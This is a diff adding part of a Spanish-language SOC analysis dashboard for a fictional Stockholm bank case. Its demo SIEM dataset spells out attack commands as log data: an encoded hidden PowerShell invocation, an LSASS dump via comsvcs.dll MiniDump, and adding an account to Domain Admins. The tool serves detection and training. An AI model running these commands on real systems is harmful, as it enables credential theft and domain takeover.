+                                <p class="text-xs text-slate-400">Respuesta a la misión: Establecer si hubo uno o varios incidentes en la infraestructura</p>
+                            </div>
+                        </div>
+                        <span id="correlation-verdict-badge" class="px-3 py-1 rounded-full text-xs font-bold bg-red-500/20 text-red-300 border border-red-500/40">
+                            2 Incidentes Detectados
+                        </span>
+                    </div>
+
+                    <div id="incidents-correlation-container" class="space-y-4">
+                        <!-- Tarjetas de Incidentes Correlacionados generadas por JS -->
+                    </div>
+                </div>
+
+                <!-- Extracción Automática de Indicadores de Compromiso (IoCs) -->
+                <div class="bg-slate-900 border border-slate-800 rounded-2xl p-6 flex flex-col justify-between">
+                    <div>
+                        <div class="flex items-center justify-between mb-4">
+                            <h3 class="text-base font-bold text-white flex items-center gap-2">
+                                <i data-lucide="fingerprint" class="w-5 h-5 text-amber-400"></i>
+                                Indicadores de Compromiso (IoC)
+                            </h3>
+                            <button onclick="copyIoCsToClipboard()" class="px-2.5 py-1 rounded-lg bg-slate-800 hover:bg-slate-700 text-xs text-cyan-300 flex items-center gap-1 transition">
+                                <i data-lucide="copy" class="w-3.5 h-3.5"></i> Copiar IoCs
+                            </button>
+                        </div>
+                        <p class="text-xs text-slate-400 mb-4">Artefactos maliciosos extraídos automáticamente de los logs para bloqueo en Firewall / EDR:</p>
+
+                        <div id="ioc-list-container" class="space-y-3 text-xs font-mono">
+                            <!-- IoCs agrupados por tipo -->
+                        </div>
+                    </div>
+
+                    <div class="mt-6 p-3.5 rounded-xl bg-slate-950 border border-slate-800 text-xs text-slate-300">
+                        <strong class="text-cyan-400 block mb-1">Tip Analista SOC L2:</strong>
+                        Los IoCs extraídos alimentan automáticamente la sección 4 (Evidencias) y sección 7 (Plan de Contención) del Informe Técnico.
+                    </div>
+                </div>
+            </div>
+
+            <!-- Línea de Tiempo Forense Correlacionada -->
+            <div class="bg-slate-900 border border-slate-800 rounded-2xl p-6">
+                <h3 class="text-base font-bold text-white mb-1 flex items-center gap-2">
+                    <i data-lucide="clock" class="w-5 h-5 text-cyan-400"></i>
+                    Línea de Tiempo de Eventos Sospechosos Correlacionados (Attack Timeline)
+                </h3>
+                <p class="text-xs text-slate-400 mb-5">Secuencia cronológica de tácticas MITRE ATT&CK detectadas en el archivo Excel</p>
+                <div id="timeline-container" class="relative border-l-2 border-slate-700 ml-3 space-y-4 pl-6 py-2">
+                    <!-- Eventos en línea de tiempo -->
+                </div>
+            </div>
+        </section>
+
+        <!-- =================================================================== -->
+        <!-- PESTAÑA 03: DASHBOARD (ESTADÍSTICAS Y GRÁFICOS INTERACTIVOS)        -->
+        <!-- =================================================================== -->
+        <section id="tab-dashboard" class="tab-content hidden space-y-6">
+            <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
+                <div>
+                    <span class="text-xs font-mono uppercase text-cyan-400">Funcionalidad 03 • Visualización Ejecutiva y Operativa</span>
+                    <h2 class="text-xl font-bold text-white">Dashboard de Seguridad por Criticidad y Vector de Ataque</h2>
+                </div>
+                <button onclick="updateDashboardCharts()" class="px-3 py-1.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-xs text-slate-200 flex items-center gap-1.5 self-start">
+                    <i data-lucide="refresh-cw" class="w-3.5 h-3.5 text-cyan-400"></i> Actualizar Gráficos
+                </button>
+            </div>
+
+            <!-- Fila 1 de Gráficos -->
+            <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                <!-- Gráfico 1: Eventos por Nivel de Criticidad -->
+                <div class="bg-slate-900 border border-slate-800 rounded-2xl p-5">
+                    <div class="flex items-center justify-between mb-3">
+                        <h3 class="text-sm font-bold text-white">Eventos Sospechosos por Criticidad</h3>
+                        <span class="text-[11px] font-mono text-slate-400">Crítico / Alto / Medio / Bajo</span>
+                    </div>
+                    <div class="h-64 flex items-center justify-center">
+                        <canvas id="chart-severity"></canvas>
+                    </div>
+                </div>
+
+                <!-- Gráfico 2: Las 6 Categorías de Detección -->
+                <div class="lg:col-span-2 bg-slate-900 border border-slate-800 rounded-2xl p-5">
+                    <div class="flex items-center justify-between mb-3">
+                        <h3 class="text-sm font-bold text-white">Distribución por Categoría de Ataque (6 Vectores SOC)</h3>
+                        <span class="text-[11px] font-mono text-cyan-400">Mapeo MITRE ATT&CK</span>
+                    </div>
+                    <div class="h-64">
+                        <canvas id="chart-categories"></canvas>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Fila 2 de Gráficos -->
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                <!-- Gráfico 3: Línea de Tiempo de Actividad Anómala por Hora -->
+                <div class="bg-slate-900 border border-slate-800 rounded-2xl p-5">
+                    <div class="flex items-center justify-between mb-3">
+                        <h3 class="text-sm font-bold text-white">Frecuencia Temporal de Eventos (Detección de Ráfagas)</h3>
+                        <span class="text-[11px] font-mono text-amber-400">Timeline SIEM</span>
+                    </div>
+                    <div class="h-64">
+                        <canvas id="chart-timeline"></canvas>
+                    </div>
+                </div>
+
+                <!-- Gráfico 4: Top Hosts y Activos Comprometidos -->
+                <div class="bg-slate-900 border border-slate-800 rounded-2xl p-5">
+                    <div class="flex items-center justify-between mb-3">
+                        <h3 class="text-sm font-bold text-white">Activos / Hosts con Mayor Actividad Sospechosa</h3>
+                        <span class="text-[11px] font-mono text-red-400">Infraestructura Cliente</span>
+                    </div>
+                    <div class="h-64">
+                        <canvas id="chart-hosts"></canvas>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- =================================================================== -->
+        <!-- PESTAÑA 04: CLASIFICACIÓN DE RIESGOS CON JUSTIFICACIÓN              -->
+        <!-- =================================================================== -->
+        <section id="tab-risks" class="tab-content hidden space-y-6">
+            <div class="bg-slate-900 border border-slate-800 rounded-2xl p-6">
+                <div class="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-5">
+                    <div>
+                        <span class="text-xs font-mono uppercase text-cyan-400">Funcionalidad 04 • Matriz de Severidad SOC Nivel 2</span>
+                        <h2 class="text-xl font-bold text-white">Clasificación de Riesgos (Crítico, Alto, Medio, Bajo) con Justificación</h2>
+                        <p class="text-xs text-slate-400 mt-1">
+                            Cada hallazgo está clasificado con su puntaje CVSS/SOC estimado y su justificación técnica. Como Analista Nivel 2, puede ajustar el nivel de riesgo o enriquecer la justificación antes de emitir el informe.
+                        </p>
+                    </div>
+                    <div class="flex items-center gap-2">
+                        <span class="px-2.5 py-1 rounded-lg bg-red-500/20 text-red-300 border border-red-500/30 text-xs font-bold">Crítico</span>
+                        <span class="px-2.5 py-1 rounded-lg bg-orange-500/20 text-orange-300 border border-orange-500/30 text-xs font-bold">Alto</span>
+                        <span class="px-2.5 py-1 rounded-lg bg-amber-500/20 text-amber-300 border border-amber-500/30 text-xs font-bold">Medio</span>
+                        <span class="px-2.5 py-1 rounded-lg bg-blue-500/20 text-blue-300 border border-blue-500/30 text-xs font-bold">Bajo</span>
+                    </div>
+                </div>
+
+                <!-- Lista de tarjetas de Hallazgos y Clasificación -->
+                <div id="risk-classification-list" class="space-y-4">
+                    <!-- Generado dinámicamente por JS -->
+                </div>
+            </div>
+        </section>
+
+        <!-- =================================================================== -->
+        <!-- PESTAÑA 05: INFORME TÉCNICO ESTRUCTURADO COMPLETO                   -->
+        <!-- =================================================================== -->
+        <section id="tab-report" class="tab-content hidden space-y-6">
+            <!-- Barra de herramientas del editor de informe -->
+            <div class="bg-slate-900 border border-slate-800 rounded-2xl p-4 flex flex-wrap items-center justify-between gap-4 no-print">
+                <div class="flex items-center gap-3">
+                    <div class="p-2 rounded-xl bg-cyan-500/10 text-cyan-400">
+                        <i data-lucide="file-check-2" class="w-5 h-5"></i>
+                    </div>
+                    <div>
+                        <h2 class="text-sm font-bold text-white">Generador de Informe Técnico SOC Nivel 2 (8 Secciones Oficiales)</h2>
+                        <p class="text-xs text-slate-400">Puede personalizar el nombre del analista o hacer clic en cualquier bloque del documento para editar texto en vivo.</p>
+                    </div>
+                </div>
+
+                <div class="flex flex-wrap items-center gap-3">
+                    <div class="flex items-center gap-2 bg-slate-950 border border-slate-800 rounded-xl px-3 py-1.5">
+                        <span class="text-xs text-slate-400">Analista L2:</span>
+                        <input id="analyst-name-input" type="text" value="Analista SOC Nivel 2 - Jec0rd3r" oninput="updateAnalystNameInReport()" class="bg-transparent text-xs font-semibold text-white focus:outline-none w-56">
+                    </div>
+
+                    <button onclick="regenerateFullReport()" class="px-3 py-1.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-xs font-medium text-slate-200 flex items-center gap-1.5 transition">
+                        <i data-lucide="rotate-ccw" class="w-3.5 h-3.5 text-cyan-400"></i> Regenerar desde Logs
+                    </button>
+
+                    <button onclick="exportReportToPDF()" class="px-4 py-2 rounded-xl bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold text-xs flex items-center gap-2 shadow-lg shadow-cyan-500/20 transition">
+                        <i data-lucide="file-down" class="w-4 h-4"></i> Descargar Informe en PDF
+                    </button>
+                </div>
+            </div>
+
+            <!-- DOCUMENTO DEL INFORME TÉCNICO (Preparado para PDF e Impresión) -->
+            <div id="printable-report" class="bg-white text-slate-900 rounded-2xl shadow-2xl border border-slate-300 max-w-5xl mx-auto p-8 sm:p-12 space-y-8">
+                <!-- Renderizado dinámico con las 8 secciones obligatorias -->
+            </div>
+        </section>
+
+        <!-- =================================================================== -->
+        <!-- PESTAÑA 06: EXPORTACIÓN Y ENTREGABLES                               -->
+        <!-- =================================================================== -->
+        <section id="tab-export" class="tab-content hidden space-y-6">
+            <div class="bg-slate-900 border border-slate-800 rounded-2xl p-6">
+                <span class="text-xs font-mono uppercase text-cyan-400">Funcionalidad 06 • Centro de Exportación</span>
+                <h2 class="text-xl font-bold text-white mt-1">Exportación del Informe Técnico en PDF y Evidencias</h2>
+                <p class="text-sm text-slate-300 mt-1 mb-6">
+                    Descargue el documento estructurado final listo para entregar al cliente (<span class="mission-client-label">Estocolmo</span>) o para adjuntar como entrega de su tarea.
+                </p>
+
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                    <!-- Opción 1: PDF Directo con html2pdf -->
+                    <div class="bg-slate-950 border border-cyan-500/40 rounded-2xl p-6 flex flex-col justify-between">
+                        <div>
+                            <div class="w-12 h-12 rounded-2xl bg-cyan-500/15 border border-cyan-500/30 flex items-center justify-center text-cyan-400 mb-4">
+                                <i data-lucide="file-down" class="w-6 h-6"></i>
+                            </div>
+                            <span class="px-2 py-0.5 rounded text-[11px] font-mono bg-cyan-500/20 text-cyan-300">Recomendado</span>
+                            <h3 class="text-lg font-bold text-white mt-2">1. Descarga Directa en PDF</h3>
+                            <p class="text-xs text-slate-400 mt-2 leading-relaxed">
+                                Genera un archivo <code class="mission-pdf-name">Informe_Tecnico_SOC_Estocolmo.pdf</code> directamente en su navegador incluyendo las 8 secciones requeridas, tablas de evidencias, clasificación de riesgos y plan de acción.
+                            </p>
+                        </div>
+                        <button onclick="exportReportToPDF()" id="btn-export-pdf-main" class="mt-6 w-full py-3 px-4 rounded-xl bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold text-sm flex items-center justify-center gap-2 shadow-lg shadow-cyan-500/20 transition">
+                            <i data-lucide="download" class="w-4 h-4"></i> Descargar Informe PDF Ahora
+                        </button>
+                    </div>
+
+                    <!-- Opción 2: Impresión / Guardar como PDF Nativo -->
+                    <div class="bg-slate-950 border border-slate-800 rounded-2xl p-6 flex flex-col justify-between">
+                        <div>
+                            <div class="w-12 h-12 rounded-2xl bg-slate-800 flex items-center justify-center text-slate-200 mb-4">
+                                <i data-lucide="printer" class="w-6 h-6"></i>
+                            </div>
+                            <span class="px-2 py-0.5 rounded text-[11px] font-mono bg-slate-800 text-slate-300">Vectorial Alta Calidad</span>
+                            <h3 class="text-lg font-bold text-white mt-2">2. Motor PDF Nativo (Imprimir a PDF)</h3>
+                            <p class="text-xs text-slate-400 mt-2 leading-relaxed">
+                                Abre la vista de impresión vectorial limpia del navegador (seleccione "Guardar como PDF") para obtener texto 100% seleccionable y paginación editorial perfecta.
+                            </p>
+                        </div>
+                        <button onclick="printReportNative()" class="mt-6 w-full py-3 px-4 rounded-xl bg-slate-800 hover:bg-slate-700 text-white font-semibold text-sm flex items-center justify-center gap-2 transition">
+                            <i data-lucide="printer" class="w-4 h-4"></i> Abrir Vista PDF Nativa
+                        </button>
+                    </div>
+
+                    <!-- Opción 3: Exportar Excel con Logs Analizados y Clasificados -->
+                    <div class="bg-slate-950 border border-slate-800 rounded-2xl p-6 flex flex-col justify-between">
+                        <div>
+                            <div class="w-12 h-12 rounded-2xl bg-emerald-500/15 border border-emerald-500/30 flex items-center justify-center text-emerald-400 mb-4">
+                                <i data-lucide="file-spreadsheet" class="w-6 h-6"></i>
+                            </div>
+                            <span class="px-2 py-0.5 rounded text-[11px] font-mono bg-emerald-500/20 text-emerald-300">Anexo Forense (.xlsx)</span>
+                            <h3 class="text-lg font-bold text-white mt-2">3. Exportar Excel Enriquecido (.xlsx)</h3>
+                            <p class="text-xs text-slate-400 mt-2 leading-relaxed">
+                                Descarga un archivo Excel con dos hojas: los logs originales etiquetados con su nivel de criticidad y una hoja resumen con todos los hallazgos e IoCs detectados.
+                            </p>
+                        </div>
+                        <button onclick="exportEnrichedExcel()" class="mt-6 w-full py-3 px-4 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold text-sm flex items-center justify-center gap-2 transition">
+                            <i data-lucide="table" class="w-4 h-4"></i> Descargar Excel Analizado (.xlsx)
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Lista de Verificación de Cumplimiento de la Tarea -->
+                <div class="mt-8 bg-slate-950 border border-slate-800 rounded-2xl p-5">
+                    <h4 class="text-xs font-mono uppercase text-cyan-400 mb-3">Checklist de Cumplimiento de Requisitos de la Tarea</h4>
+                    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3 text-xs">
+                        <div class="flex items-center gap-2 text-emerald-400"><i data-lucide="check-circle-2" class="w-4 h-4 shrink-0"></i><span>1. Resumen ejecutivo incluido</span></div>
+                        <div class="flex items-center gap-2 text-emerald-400"><i data-lucide="check-circle-2" class="w-4 h-4 shrink-0"></i><span>2. Hallazgos identificados (6 tipos)</span></div>
+                        <div class="flex items-center gap-2 text-emerald-400"><i data-lucide="check-circle-2" class="w-4 h-4 shrink-0"></i><span>3. Explicación técnica detallada</span></div>
+                        <div class="flex items-center gap-2 text-emerald-400"><i data-lucide="check-circle-2" class="w-4 h-4 shrink-0"></i><span>4. Evidencias encontradas en logs</span></div>
+                        <div class="flex items-center gap-2 text-emerald-400"><i data-lucide="check-circle-2" class="w-4 h-4 shrink-0"></i><span>5. Criticidad y justificación</span></div>
+                        <div class="flex items-center gap-2 text-emerald-400"><i data-lucide="check-circle-2" class="w-4 h-4 shrink-0"></i><span>6. Posible impacto organizacional</span></div>
+                        <div class="flex items-center gap-2 text-emerald-400"><i data-lucide="check-circle-2" class="w-4 h-4 shrink-0"></i><span>7. Plan: investigar, contener, remediar</span></div>
+                        <div class="flex items-center gap-2 text-emerald-400"><i data-lucide="check-circle-2" class="w-4 h-4 shrink-0"></i><span>8. Recomendaciones generales</span></div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- FOOTER -->
+    <footer class="border-t border-slate-800/80 bg-slate-950/60 py-4 mt-12 no-print">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 flex flex-col sm:flex-row items-center justify-between text-xs text-slate-400 gap-2">
+            <div>NordicSec Cyber Defense Operations Center • (Jec0d3r)</div>
+            <div class="font-mono">MITRE ATT&CK® v15 Mapping • SheetJS • Chart.js • PDF Engine</div>
+        </div>
+    </footer>
+
+    <!-- ======================================================================= -->
+    <!-- LÓGICA COMPLETA DE LA APLICACIÓN (MOTOR SIEM, CORRELACIÓN, CHARTS, PDF) -->
+    <!-- ======================================================================= -->
+    <script>
+        // Estado global de la aplicación
+        let currentDatasetName = "Caso_Estocolmo_SIEM.xlsx";
+        let rawLogs = [];
+        let analyzedLogs = [];
+        let securityFindings = [];
+        let correlatedIncidents = [];
+        let extractedIoCs = { ips: [], users: [], hosts: [], commands: [] };
+        let activeCategoryFilter = "ALL";
+
+        // ---- Misiones: la misión por defecto es el caso Estocolmo (KronaBank) ----
+        const DEFAULT_MISSION = { id: "default", company: "KronaBank Financial AB (Estocolmo)", description: "", caseId: "SE-2026-884", isDefault: true };
+        let currentMission = DEFAULT_MISSION;
+        let savedMissions = [];
+        let defaultUI = null;
+
+        function storageGet(k) { try { return localStorage.getItem(k); } catch (e) { return null; } }
+        function storageSet(k, v) { try { localStorage.setItem(k, v); } catch (e) { /* sin almacenamiento disponible */ } }
+        function persistMissions() {
+            storageSet("soc_missions_v1", JSON.stringify(savedMissions));
+            storageSet("soc_active_mission", currentMission.id);
+        }
+        function missionSlug() {
+            if (currentMission.isDefault) return "Estocolmo";
+            const slug = currentMission.company.normalize("NFD").replace(/[\u0300-\u036f]/g, "").replace(/[^A-Za-z0-9]+/g, "_").replace(/^_+|_+$/g, "").slice(0, 40);
+            return slug || "Mision";
+        }
+
+        function applyMissionToUI() {
+            const m = currentMission, $ = id => document.getElementById(id);
+            if (!defaultUI) {
+                defaultUI = { sub: $("mm-subtitle").innerHTML, title: $("mm-scenario-title").innerHTML, desc: $("mm-scenario-desc").innerHTML,
+                              fcase: $("ficha-case").innerHTML, fcompany: $("ficha-company").innerHTML };
+            }
+            $("header-mission-name").textContent = m.company;
+            if (m.isDefault) {
+                $("mm-subtitle").innerHTML = defaultUI.sub;
+                $("mm-scenario-title").innerHTML = defaultUI.title;
+                $("mm-scenario-desc").innerHTML = defaultUI.desc;
+                $("ficha-case").innerHTML = defaultUI.fcase;
+                $("ficha-company").innerHTML = defaultUI.fcompany;
+                $("ficha-desc-wrap").classList.add("hidden");
+            } else {
+                $("mm-subtitle").textContent = `NordicSec Cyber Defense | Caso ${m.caseId}`;
+                $("mm-scenario-title").textContent = m.company;
+                $("mm-scenario-desc").textContent = m.description || "Sin descripción. Cargue el Excel del SIEM del cliente para iniciar el análisis.";
+                $("ficha-case").textContent = `Misión personalizada • Caso #${m.caseId}`;
+                $("ficha-company").textContent = m.company;
+                $("ficha-desc").textContent = m.description || "Sin descripción.";
+                $("ficha-desc-wrap").classList.remove("hidden");
+            }
+            document.querySelectorAll(".mission-client-label").forEach(el => el.textContent = m.isDefault ? "Estocolmo" : m.company);
+            document.querySelectorAll(".mission-pdf-name").forEach(el => el.textContent = `Informe_Tecnico_SOC_${missionSlug()}.pdf`);
+        }
+
+        function toggleNewMissionModal() {
+            const modal = document.getElementById("new-mission-modal");
+            const opening = modal.classList.contains("hidden");
+            modal.classList.toggle("hidden", !opening);
+            modal.classList.toggle("flex", opening);
+            if (opening) {
+                document.getElementById("nm-error").classList.add("hidden");
+                renderMissionList();
+                document.getElementById("nm-company").focus();
+            }
+        }
+
+        function renderMissionList() {
+            const all = [DEFAULT_MISSION, ...savedMissions];
+            document.getElementById("nm-list").innerHTML = all.map(m => {
+                const active = m.id === currentMission.id;
+                const del = m.isDefault ? "" : `<button onclick="deleteMission('${m.id}')" class="px-2 py-1 rounded-lg text-[11px] text-red-300 hover:bg-red-500/10">Eliminar</button>`;
+                const act = active
+                    ? `<span class="px-2 py-1 rounded-lg text-[11px] bg-emerald-500/15 text-emerald-300 border border-emerald-500/30">Activa</span>`
+                    : `<button onclick="activateMission('${m.id}')" class="px-2.5 py-1 rounded-lg text-[11px] bg-slate-800 hover:bg-slate-700 text-slate-200">Activar</button>`;
+                return `<div class="flex items-center justify-between gap-3 p-2.5 rounded-xl bg-slate-950 border border-slate-800">
+                    <div class="min-w-0"><div class="text-xs font-semibold text-white truncate">${escapeHtml(m.company)}</div>
+                    <div class="text-[11px] text-slate-400 font-mono">Caso ${escapeHtml(m.caseId)}${m.isDefault ? " • demo" : ""}</div></div>
+                    <div class="flex items-center gap-1 shrink-0">${del}${act}</div></div>`;
+            }).join("");
+        }
+
+        function createMission() {
+            const company = document.getElementById("nm-company").value.trim();
+            const description = document.getElementById("nm-desc").value.trim();
+            const err = document.getElementById("nm-error");
+            if (!company) {
+                err.textContent = "Escriba el nombre de la compañía para crear la misión.";
+                err.classList.remove("hidden");
+                return;
+            }
+            const caseId = `M-${new Date().getFullYear()}-${String(savedMissions.length + 1).padStart(3, "0")}`;
+            savedMissions.push({ id: "m" + Date.now(), company, description, caseId, isDefault: false });
+            document.getElementById("nm-company").value = "";
+            document.getElementById("nm-desc").value = "";
+            activateMission(savedMissions[savedMissions.length - 1].id);
+            toggleNewMissionModal();
+            showToast(`Misión '${company}' creada. Cargue el Excel del SIEM del cliente.`, "success");
+        }
+
+        function activateMission(id) {
+            const m = id === "default" ? DEFAULT_MISSION : savedMissions.find(x => x.id === id);
+            if (!m) return;
+            currentMission = m;
+            persistMissions();
+            applyMissionToUI();
+            if (m.isDefault) {
+                loadStockholmDataset();
+            } else {
+                rawLogs = [];
+                currentDatasetName = "Sin_dataset.xlsx";
+                document.getElementById("header-dataset-name").textContent = "Dataset: pendiente de carga";
+                analyzeSIEMLogs(rawLogs);
+                switchTab("tab-upload");
+            }
+            if (!document.getElementById("new-mission-modal").classList.contains("hidden")) renderMissionList();
+        }
+
+        function deleteMission(id) {
+            const wasActive = currentMission.id === id;
+            savedMissions = savedMissions.filter(x => x.id !== id);
+            if (wasActive) { activateMission("default"); } else { persistMissions(); }
+            renderMissionList();
+        }
+
+        // Instancias de Chart.js
+        let severityChartInstance = null;
+        let categoriesChartInstance = null;
+        let timelineChartInstance = null;
+        let hostsChartInstance = null;
+
+        // Definición de las 6 categorías obligatorias de la aplicación
+        const SIX_CATEGORIES_META = {
+            "Fuerza bruta": {
+                id: "Fuerza bruta",
+                title: "Fuerza bruta",
+                subtitle: "Intentos de acceso no autorizados.",
+                mitre: "T1110 - Brute Force",
+                icon: "key-round",
+                color: "red",
+                badgeClass: "bg-red-500/15 text-red-300 border-red-500/30"
+            },
+            "Inicios sospechosos": {
+                id: "Inicios sospechosos",
+                title: "Inicios sospechosos",
+                subtitle: "Sesiones anómalas por origen, horario o patrón.",
+                mitre: "T1078 - Valid Accounts",
+                icon: "user-check",
+                color: "amber",
+                badgeClass: "bg-amber-500/15 text-amber-300 border-amber-500/30"
+            },
+            "Escalamiento": {
+                id: "Escalamiento",
+                title: "Escalamiento",
+                subtitle: "Elevación de privilegios.",
+                mitre: "T1548 / T1098 - Privilege Escalation",
+                icon: "chevrons-up",
+                color: "orange",
+                badgeClass: "bg-orange-500/15 text-orange-300 border-orange-500/30"
+            },
+            "Comandos y procesos": {
+                id: "Comandos y procesos",
+                title: "Comandos y procesos",
+                subtitle: "Ejecución sospechosa en equipos.",
+                mitre: "T1059 - Command & Scripting Interpreter",
+                icon: "terminal",
+                color: "purple",
+                badgeClass: "bg-purple-500/15 text-purple-300 border-purple-500/30"
+            },
+            "Movimiento lateral": {
+                id: "Movimiento lateral",
+                title: "Movimiento lateral",
+                subtitle: "Saltos entre sistemas de la red.",
+                mitre: "T1021 - Remote Services (SMB/RDP/WinRM)",
+                icon: "network",
+                color: "cyan",
+                badgeClass: "bg-cyan-500/15 text-cyan-300 border-cyan-500/30"
+            },
+            "Otras anomalías": {
+                id: "Otras anomalías",
+                title: "Otras anomalías",
+                subtitle: "Cualquier comportamiento fuera de lo normal.",
+                mitre: "T1041 / T1071 - Exfiltration & C2",
+                icon: "radar",
+                color: "emerald",
+                badgeClass: "bg-emerald-500/15 text-emerald-300 border-emerald-500/30"
+            }
+        };
+
+        // =====================================================================
+        // 1. DATASET REALISTA DEL CASO ESTOCOLMO (CON 2 INCIDENTES DIFERENCIADOS)
+        // =====================================================================
+        function getStockholmDefaultLogs() {
+            return [
+                // Tráfico normal de oficina en Estocolmo
+                { Timestamp: "2026-10-26 01:10:04", EventID: "4624", Host: "STHLM-WEB-01", User: "anna.lindqvist", SourceIP: "10.20.1.15", DestIP: "10.20.0.10", Action: "Logon Success", Command: "svchost.exe -k netsvcs", Details: "Inicio de sesión matutino habitual por VPN corporativa Suecia" },
+                { Timestamp: "2026-10-26 01:12:30", EventID: "1001", Host: "STHLM-FILE-01", User: "erik.svensson", SourceIP: "10.20.1.22", DestIP: "10.20.0.25", Action: "File Read", Command: "explorer.exe", Details: "Lectura de plantillas financieras Q4" },
+
+                // INCIDENTE #1: Intrusión por Fuerza Bruta VPN -> Inicio Sospechoso -> Escalamiento -> Comandos -> Movimiento Lateral -> Exfiltración C2
+                { Timestamp: "2026-10-26 02:14:02", EventID: "4625", Host: "STHLM-VPN-GW01", User: "svc_backup", SourceIP: "185.220.101.45", DestIP: "10.20.0.5", Action: "Logon Failed", Command: "sshd: Auth fail", Details: "Fallo de autenticación por contraseña incorrecta desde nodo externo TOR (Intento 1/45)" },
+                { Timestamp: "2026-10-26 02:14:05", EventID: "4625", Host: "STHLM-VPN-GW01", User: "svc_backup", SourceIP: "185.220.101.45", DestIP: "10.20.0.5", Action: "Logon Failed", Command: "sshd: Auth fail", Details: "Múltiples intentos fallidos por diccionario SSH/VPN contra cuenta svc_backup (Intento 18/45)" },
+                { Timestamp: "2026-10-26 02:14:09", EventID: "4625", Host: "STHLM-VPN-GW01", User: "svc_backup", SourceIP: "185.220.101.45", DestIP: "10.20.0.5", Action: "Logon Failed", Command: "sshd: Auth fail", Details: "Ataque de fuerza bruta sostenido desde IP externa 185.220.101.45 (Intento 39/45)" },
+                { Timestamp: "2026-10-26 02:14:15", EventID: "4625", Host: "STHLM-VPN-GW01", User: "admin_se", SourceIP: "185.220.101.45", DestIP: "10.20.0.5", Action: "Logon Failed", Command: "sshd: Auth fail", Details: "Password spraying detectado contra usuarios privilegiados en pasarela VPN Estocolmo" },
+
+                // 2. Inicio sospechoso (02:15 AM fuera de horario desde IP maliciosa tras fuerza bruta)
+                { Timestamp: "2026-10-26 02:15:11", EventID: "4624", Host: "STHLM-VPN-GW01", User: "svc_backup", SourceIP: "185.220.101.45", DestIP: "10.20.1.40", Action: "Logon Success (Anomalous)", Command: "LogonType=10 (RemoteInteractive)", Details: "Inicio de sesión exitoso a las 02:15 AM (horario no laboral) desde IP externa 185.220.101.45 tras ráfaga de fallos" },
+                { Timestamp: "2026-10-26 02:16:40", EventID: "4624", Host: "STHLM-APP-02", User: "svc_backup", SourceIP: "10.20.1.40", DestIP: "10.20.1.55", Action: "Unusual Session", Command: "rdpclip.exe", Details: "Sesión interactiva inusual iniciada por cuenta de servicio svc_backup (nunca antes inició por escritorio remoto)" },
+
+                // 4. Comandos y procesos sospechosos (Reconocimiento y ejecución PowerShell codificado)
+                { Timestamp: "2026-10-26 02:18:05", EventID: "4688", Host: "STHLM-APP-02", User: "svc_backup", SourceIP: "10.20.1.55", DestIP: "10.20.1.55", Action: "Process Creation", Command: "cmd.exe /c whoami /priv && net user /domain", Details: "Enumeración de privilegios locales y cuentas del dominio Active Directory" },
+                { Timestamp: "2026-10-26 02:19:22", EventID: "4104", Host: "STHLM-APP-02", User: "svc_backup", SourceIP: "10.20.1.55", DestIP: "185.220.101.45", Action: "ScriptBlockExecution", Command: "powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAA==", Details: "Ejecución de PowerShell ofuscado en Base64 descargando payload en memoria" },
+
+                // 3. Escalamiento de privilegios
+                { Timestamp: "2026-10-26 02:21:10", EventID: "4672", Host: "STHLM-APP-02", User: "svc_backup", SourceIP: "10.20.1.55", DestIP: "10.20.1.55", Action: "Privilege Escalation", Command: "SeDebugPrivilege Assigned / token elevation", Details: "Asignación de privilegios equivalentes a SYSTEM (SeDebugPrivilege) mediante abuso de servicio local" },
+                { Timestamp: "2026-10-26 02:22:48", EventID: "4728", Host: "STHLM-APP-02", User: "svc_backup", SourceIP: "10.20.1.55", DestIP: "10.20.0.10", Action: "Group Membership Change", Command: "net localgroup Administrators svc_backup /add && net group 'Domain Admins' svc_backup /add", Details: "Elevación crítica: La cuenta comprometida svc_backup fue agregada al grupo de Administradores de Dominio" },
+
+                // Volcado de credenciales (Comandos y procesos)
+                { Timestamp: "2026-10-26 02:24:15", EventID: "4688", Host: "STHLM-APP-02", User: "svc_backup", SourceIP: "10.20.1.55", DestIP: "10.20.1.55", Action: "Credential Dumping", Command: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\lsass.dmp full", Details: "Volcado de memoria del proceso LSASS (estilo Mimikatz) para extracción de hashes NTLM" },
+
+                // 5. Movimiento lateral hacia Controlador de Dominio y Base de Datos
+                { Timestamp: "2026-10-26 02:27:03", EventID: "5140", Host: "STHLM-DC-01", User: "svc_backup", SourceIP: "10.20.1.55", DestIP: "10.20.0.10", Action: "Lateral Movement SMB", Command: "\\\\10.20.0.10\\ADMIN$ & \\\\10.20.0.10\\C$", Details: "Salto lateral por recurso administrativo SMB (Pass-the-Hash) desde STHLM-APP-02 hacia el Controlador de Dominio STHLM-DC-01" },
+                { Timestamp: "2026-10-26 02:28:40", EventID: "4648", Host: "STHLM-DC-01", User: "svc_backup", SourceIP: "10.20.1.55", DestIP: "10.20.0.10", Action: "Lateral Movement WinRM", Command: "wsmprovhost.exe - WinRM Remote Shell", Details: "Ejecución remota vía WinRM (Puerto 5985) entre servidor de aplicaciones y Controlador de Dominio" },
+                { Timestamp: "2026-10-26 02:31:12", EventID: "4624", Host: "STHLM-DB-PROD", User: "svc_backup", SourceIP: "10.20.0.10", DestIP: "10.20.0.50", Action: "Lateral Movement RDP", Command: "mstsc.exe /v:10.20.0.50 (Port 3389)", Details: "Movimiento lateral mediante salto RDP interno desde el Controlador de Dominio hacia la Base de Datos de Producción" },
+
